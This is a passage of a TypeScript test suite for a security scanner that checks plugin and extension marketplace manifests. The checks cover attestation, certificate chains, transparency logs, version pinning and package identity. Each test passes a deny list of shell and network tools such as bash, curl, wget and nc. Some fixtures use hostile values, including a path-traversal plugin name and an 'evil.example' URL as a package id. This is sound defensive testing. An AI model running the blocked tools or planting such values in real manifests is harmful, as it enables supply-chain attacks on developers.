      filePath: ".roo/marketplace.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some(
        (finding) => finding.rule_id === "plugin-manifest-incomplete-attestation-strict",
      ),
    ).toBe(true);
  });

  it("does not flag complete attestation metadata", () => {
    const textContent = JSON.stringify(
      {
        plugins: [
          {
            name: "complete-attestation-plugin",
            provenance: {
              verified: true,
              issuer: "https://marketplace.roocode.com/oidc",
              subject: "pkg:roo/acme-safe-plugin@1.2.3",
              digest: "sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
              transparencyLog: {
                verified: true,
                logIndex: 33,
                checkpoint: {
                  treeSize: 100,
                },
              },
            },
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".roo/marketplace.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-incomplete-attestation"),
    ).toBe(false);
  });

  it("treats OpenCode attestation issuers as trusted on OpenCode manifests", () => {
    const textContent = JSON.stringify(
      {
        plugins: [
          {
            name: "opencode-trusted-issuer-plugin",
            provenance: {
              verified: true,
              issuer: "https://registry.opencode.ai/oidc",
              subject: "pkg:npm/@opencode/plugin@1.2.3",
            },
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".opencode/plugins.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some(
        (finding) => finding.rule_id === "plugin-manifest-untrusted-attestation-issuer",
      ),
    ).toBe(false);
  });

  it("flags OpenCode attestation issuers outside OpenCode profile", () => {
    const textContent = JSON.stringify(
      {
        extensions: [
          {
            id: "cross-marketplace-issuer",
            provenance: {
              verified: true,
              issuer: "https://registry.opencode.ai/oidc",
              subject: "pkg:npm/@opencode/plugin@1.2.3",
            },
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".zed/extensions.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some(
        (finding) => finding.rule_id === "plugin-manifest-untrusted-attestation-issuer",
      ),
    ).toBe(true);
  });

  it("requires digest fields in VS Code attestation profile", () => {
    const textContent = JSON.stringify(
      {
        extensions: [
          {
            id: "vscode-missing-digest",
            provenance: {
              verified: true,
              issuer: "https://vstoken.dev.azure.com",
              subject: "pkg:vsix/github.copilot-chat@1.0.0",
            },
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".vscode/extensions.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-incomplete-attestation"),
    ).toBe(true);
  });

  it("emits strict-profile schema rule id for incomplete attestation metadata", () => {
    const textContent = JSON.stringify(
      {
        extensions: [
          {
            id: "vscode-missing-digest",
            provenance: {
              verified: true,
              issuer: "https://vstoken.dev.azure.com",
              subject: "pkg:vsix/github.copilot-chat@1.0.0",
            },
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".vscode/extensions.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some(
        (finding) => finding.rule_id === "plugin-manifest-incomplete-attestation-strict",
      ),
    ).toBe(true);
  });

  it("does not require digest fields in OpenCode attestation profile", () => {
    const textContent = JSON.stringify(
      {
        plugins: [
          {
            name: "opencode-no-digest",
            provenance: {
              verified: true,
              issuer: "https://registry.opencode.ai/oidc",
              subject: "pkg:npm/@opencode/plugin@1.2.3",
            },
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".opencode/plugins.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-incomplete-attestation"),
    ).toBe(false);
  });

  it("flags invalid certificate-chain verification signals", () => {
    const textContent = JSON.stringify(
      {
        extensions: [
          {
            id: "invalid-chain-extension",
            provenance: {
              verified: true,
              issuer: "https://vstoken.dev.azure.com",
              subject: "pkg:vsix/github.copilot-chat@1.0.0",
              digest: "sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
              certificateChain: {
                verified: false,
              },
              transparencyLog: {
                verified: true,
                logIndex: 1234,
              },
            },
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".vscode/extensions.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-invalid-cert-chain"),
    ).toBe(true);
  });

  it("does not flag valid certificate-chain verification signals", () => {
    const textContent = JSON.stringify(
      {
        extensions: [
          {
            id: "valid-chain-extension",
            provenance: {
              verified: true,
              issuer: "https://vstoken.dev.azure.com",
              subject: "pkg:vsix/github.copilot-chat@1.0.0",
              digest: "sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
              certificateChain: {
                verified: true,
              },
              transparencyLog: {
                verified: true,
                logIndex: 2345,
              },
            },
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".vscode/extensions.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-invalid-cert-chain"),
    ).toBe(false);
  });

  it("flags transparency log proof verification failures", () => {
    const textContent = JSON.stringify(
      {
        extensions: [
          {
            id: "failed-tlog-extension",
            provenance: {
              verified: true,
              issuer: "https://vstoken.dev.azure.com",
              subject: "pkg:vsix/github.copilot-chat@1.0.0",
              digest: "sha256:cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc",
              transparencyLog: {
                verified: false,
                logIndex: 3456,
              },
            },
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".vscode/extensions.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-transparency-proof-failed"),
    ).toBe(true);
  });

  it("flags transparency proof bypass flags", () => {
    const textContent = JSON.stringify(
      {
        extensions: [
          {
            id: "bypass-tlog-extension",
            allowMissingTlog: true,
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".vscode/extensions.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-transparency-bypass"),
    ).toBe(true);
  });

  it("requires transparency proof metadata in strict attestation profiles", () => {
    const textContent = JSON.stringify(
      {
        extensions: [
          {
            id: "missing-tlog-proof",
            provenance: {
              verified: true,
              issuer: "https://vstoken.dev.azure.com",
              subject: "pkg:vsix/github.copilot-chat@1.0.0",
              digest: "sha256:dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd",
            },
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".vscode/extensions.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-missing-transparency-proof"),
    ).toBe(true);
  });

  it("does not require transparency proof metadata in base attestation profiles", () => {
    const textContent = JSON.stringify(
      {
        plugins: [
          {
            name: "opencode-no-tlog",
            provenance: {
              verified: true,
              issuer: "https://registry.opencode.ai/oidc",
              subject: "pkg:npm/@opencode/plugin@1.2.3",
            },
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".opencode/plugins.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-missing-transparency-proof"),
    ).toBe(false);
  });

  it("requires transparency proof metadata in Roo marketplace attestation profile", () => {
    const textContent = JSON.stringify(
      {
        plugins: [
          {
            name: "roo-no-tlog",
            provenance: {
              verified: true,
              issuer: "https://marketplace.roocode.com/oidc",
              subject: "pkg:roo/acme-safe-plugin@1.2.3",
              digest: "sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
            },
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".roo/marketplace.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-missing-transparency-proof"),
    ).toBe(true);
  });

  it("flags certificate policies that omit code-signing EKU/OID in strict profiles", () => {
    const textContent = JSON.stringify(
      {
        extensions: [
          {
            id: "strict-profile-missing-code-signing",
            provenance: {
              verified: true,
              issuer: "https://vstoken.dev.azure.com",
              subject: "pkg:vsix/github.copilot-chat@1.0.0",
              digest: "sha256:eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee",
              certificateChain: {
                verified: true,
                extendedKeyUsage: ["1.3.6.1.5.5.7.3.1"],
                policyOids: ["1.2.3.4.5"],
              },
              transparencyLog: {
                verified: true,
                logIndex: 42,
                checkpoint: {
                  treeSize: 100,
                },
              },
            },
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".vscode/extensions.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-invalid-cert-policy"),
    ).toBe(true);
  });

  it("does not flag certificate policies that include code-signing EKU/OID in strict profiles", () => {
    const textContent = JSON.stringify(
      {
        extensions: [
          {
            id: "strict-profile-code-signing",
            provenance: {
              verified: true,
              issuer: "https://vstoken.dev.azure.com",
              subject: "pkg:vsix/github.copilot-chat@1.0.0",
              digest: "sha256:ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
              certificateChain: {
                verified: true,
                extendedKeyUsage: ["1.3.6.1.5.5.7.3.3"],
              },
              transparencyLog: {
                verified: true,
                logIndex: 43,
                checkpoint: {
                  treeSize: 100,
                },
              },
            },
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".vscode/extensions.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-invalid-cert-policy"),
    ).toBe(false);
  });

  it("does not enforce certificate policy checks in base profiles", () => {
    const textContent = JSON.stringify(
      {
        plugins: [
          {
            name: "base-profile-policy",
            provenance: {
              verified: true,
              issuer: "https://registry.opencode.ai/oidc",
              subject: "pkg:npm/@opencode/plugin@1.2.3",
              certificateChain: {
                verified: true,
                extendedKeyUsage: ["1.3.6.1.5.5.7.3.1"],
              },
            },
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".opencode/plugins.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-invalid-cert-policy"),
    ).toBe(false);
  });

  it("flags transparency checkpoint inconsistencies when log index exceeds tree size", () => {
    const textContent = JSON.stringify(
      {
        extensions: [
          {
            id: "checkpoint-inconsistent",
            provenance: {
              verified: true,
              issuer: "https://vstoken.dev.azure.com",
              subject: "pkg:vsix/github.copilot-chat@1.0.0",
              digest: "sha256:1111111111111111111111111111111111111111111111111111111111111111",
              transparencyLog: {
                verified: true,
                logIndex: 1500,
                checkpoint: {
                  treeSize: 1200,
                },
              },
            },
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".vscode/extensions.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some(
        (finding) => finding.rule_id === "plugin-manifest-transparency-checkpoint-inconsistent",
      ),
    ).toBe(true);
  });

  it("does not flag transparency checkpoints when log index and tree size are consistent", () => {
    const textContent = JSON.stringify(
      {
        extensions: [
          {
            id: "checkpoint-consistent",
            provenance: {
              verified: true,
              issuer: "https://vstoken.dev.azure.com",
              subject: "pkg:vsix/github.copilot-chat@1.0.0",
              digest: "sha256:2222222222222222222222222222222222222222222222222222222222222222",
              transparencyLog: {
                verified: true,
                logIndex: 1100,
                checkpoint: {
                  treeSize: 1200,
                },
              },
            },
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".vscode/extensions.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some(
        (finding) => finding.rule_id === "plugin-manifest-transparency-checkpoint-inconsistent",
      ),
    ).toBe(false);
  });

  it("flags version-qualified VS Code extension recommendation IDs", () => {
    const textContent = JSON.stringify(
      {
        recommendations: ["github.copilot-chat@latest"],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".vscode/extensions.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-versioned-extension-id"),
    ).toBe(true);
  });

  it("flags source-bearing plugin entries without package identity fields", () => {
    const textContent = JSON.stringify(
      {
        plugins: [
          {
            source: "https://registry.npmjs.org/@safe/plugin",
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".opencode/plugins.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-missing-package-identity"),
    ).toBe(true);
  });

  it("does not flag source-bearing entries with package identity fields", () => {
    const textContent = JSON.stringify(
      {
        plugins: [
          {
            name: "safe-plugin",
            source: "https://registry.npmjs.org/@safe/plugin",
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".opencode/plugins.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-missing-package-identity"),
    ).toBe(false);
  });

  it("flags unpinned extension version selectors in marketplace manifests", () => {
    const textContent = JSON.stringify(
      {
        extensions: [
          {
            id: "zed.unsafe",
            version: "^1.2.3",
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".zed/extensions.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(findings.some((finding) => finding.rule_id === "plugin-manifest-unpinned-version")).toBe(
      true,
    );
  });

  it("does not flag pinned extension versions in marketplace manifests", () => {
    const textContent = JSON.stringify(
      {
        extensions: [
          {
            id: "zed.safe",
            version: "1.2.3",
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".zed/extensions.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(findings.some((finding) => finding.rule_id === "plugin-manifest-unpinned-version")).toBe(
      false,
    );
  });

  it("flags unscoped Zed extension ids", () => {
    const textContent = JSON.stringify(
      {
        extensions: [
          {
            id: "safe-extension",
            publisher: "zed",
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".zed/extensions.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-unscoped-extension-id"),
    ).toBe(true);
  });

  it("flags Zed publisher identity mismatch with extension id namespace", () => {
    const textContent = JSON.stringify(
      {
        extensions: [
          {
            id: "acme.safe-extension",
            publisher: "zed",
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".zed/extensions.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-publisher-identity-mismatch"),
    ).toBe(true);
  });

  it("flags invalid path-like package identity values", () => {
    const textContent = JSON.stringify(
      {
        plugins: [
          {
            name: "../evil-plugin",
            source: "https://registry.npmjs.org/@safe/plugin",
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".opencode/plugins.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-invalid-package-identity"),
    ).toBe(true);
  });

  it("flags URL-like package identity values", () => {
    const textContent = JSON.stringify(
      {
        plugins: [
          {
            id: "https://evil.example/pkg",
            source: "https://registry.npmjs.org/@safe/plugin",
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".roo/marketplace.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-invalid-package-identity"),
    ).toBe(true);
  });

  it("flags disallowed publisher namespaces in VS Code extension recommendations", () => {
    const textContent = JSON.stringify(
      {
        recommendations: ["local.copilot-chat"],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".vscode/extensions.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-disallowed-namespace"),
    ).toBe(true);
  });

  it("does not flag trusted publisher namespaces in VS Code extension recommendations", () => {
    const textContent = JSON.stringify(
      {
        recommendations: ["github.copilot-chat"],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".vscode/extensions.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-disallowed-namespace"),
    ).toBe(false);
  });
});
